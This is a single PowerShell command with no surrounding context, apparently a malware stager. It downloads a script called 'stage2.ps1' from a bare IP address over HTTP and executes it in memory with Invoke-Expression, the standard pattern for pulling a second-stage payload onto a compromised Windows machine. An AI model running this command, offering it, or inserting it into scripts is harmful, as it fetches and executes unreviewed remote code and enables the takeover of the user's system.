
IEX (Invoke-WebRequest -Uri "http://198.51.100.206/stage2.ps1" -UseBasicParsing).Content; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
